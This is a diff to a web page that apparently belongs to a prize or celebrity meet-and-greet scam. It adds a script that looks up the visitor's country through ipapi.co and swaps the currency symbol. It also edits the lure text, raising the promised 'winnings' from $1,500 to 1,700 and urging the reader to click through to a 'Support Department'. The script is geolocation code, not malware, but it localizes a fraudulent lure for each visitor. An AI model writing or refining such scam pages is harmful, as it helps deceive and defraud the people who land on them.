@@ -59,6 +59,38 @@ Verification
 </style>
 
 
+
+
+<script>
+  async function convertCurrency() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      const country = data.country_code;
+
+      const currencySymbolElements = document.getElementsByClassName('currency-symbol');
+
+      if (country === 'GB') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '£';
+        });
+      } else if (country === 'DE' || country === 'FR' || country === 'ES' || country === 'NL') {
+        Array.from(currencySymbolElements).forEach(element => {
+          element.textContent = '€';
+        });
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  }
+  
+  document.addEventListener('DOMContentLoaded', convertCurrency);
+</script>
+
+
+
+
+
 <body class="default home light" style="position: unset;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
 
 
@@ -90,7 +122,8 @@ Processing . . .
 <h5 class="text-107px">
  
 
-The meet and greet is absolutely free. You're all set! All you have to do now is contact the Support Department for important details, including the specific venue, date, and time of the meet and greet. The Support Department will also guide you on receiving your $1,500 winnings immediately. To proceed, simply click the Support Department button below.
+The meet and greet is absolutely free. You're all set! All you have to do now is contact the Support Department for important details, including the specific venue, date, and time of the meet and greet. The Support Department will also guide you on receiving your 
+<span class="currency-symbol">$</span>1,700 winnings immediately. To proceed, simply click the Support Department button below.
 
 
 
